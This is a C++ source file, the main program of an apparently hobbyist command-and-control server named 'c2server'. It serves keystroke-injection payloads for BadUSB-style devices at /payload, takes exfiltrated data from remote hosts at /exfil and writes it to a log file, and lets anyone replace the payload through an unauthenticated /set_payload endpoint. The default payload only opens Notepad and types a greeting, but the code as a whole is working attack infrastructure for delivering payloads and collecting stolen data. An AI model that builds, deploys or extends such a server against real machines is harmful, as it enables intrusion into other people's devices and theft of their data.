import c2server.config;
import c2server.exfil;
import c2server.http;
import c2server.logger;
import c2server.payload;
import c2server.router;
import c2server.server;
import std;

namespace {

   std::string_view kDefaultPayload = "WIN_R\n"
                                      "DELAY:600\n"
                                      "notepad\n"
                                      "ENTER\n"
                                      "DELAY:1000\n"
                                      "Hello from remote payload!\n";

   c2server::HttpResponse ok(std::string body, std::string contentType = "text/plain") {
      return {200, std::move(body), std::move(contentType)};
   }

   void addDefaultEndpoints(c2server::Router& router, std::shared_ptr<c2server::PayloadStoreBase> payload,
                            c2server::ExfilFn exfil) {
      router.get("/payload", [payload](const c2server::HttpRequest& req) {
         c2server::log::info("Payload requested by {}", req.remoteIp);
         return ok(payload->get());
      });

      router.post("/exfil", [exfil = std::move(exfil)](const c2server::HttpRequest& req) {
         c2server::log::info("Exfil from {}: {} bytes", req.remoteIp, req.body.size());
         c2server::log::debug("Exfil data:\n{}", req.body);
         exfil(req.remoteIp, req.body);
         return ok("ok");
      });

      router.post("/set_payload", [payload = std::move(payload)](const c2server::HttpRequest& req) {
         payload->set(req.body);
         c2server::log::info("Payload updated by {}", req.remoteIp);
         return ok("payload updated");
      });
   }

} // namespace

int main() {
   auto logShutdownGuard = c2server::log::init("c2server.log");
   c2server::log::info("Starting c2server");

   auto payload = std::make_shared<c2server::PayloadStore>(c2server::InitialPayload{std::string{kDefaultPayload}});
   auto router = std::make_shared<c2server::Router>();
   addDefaultEndpoints(*router, payload, c2server::makeFileExfil("exfil.log"));

   c2server::Server{c2server::Host{"0.0.0.0"}, c2server::Port{8080}, router}.run();
}
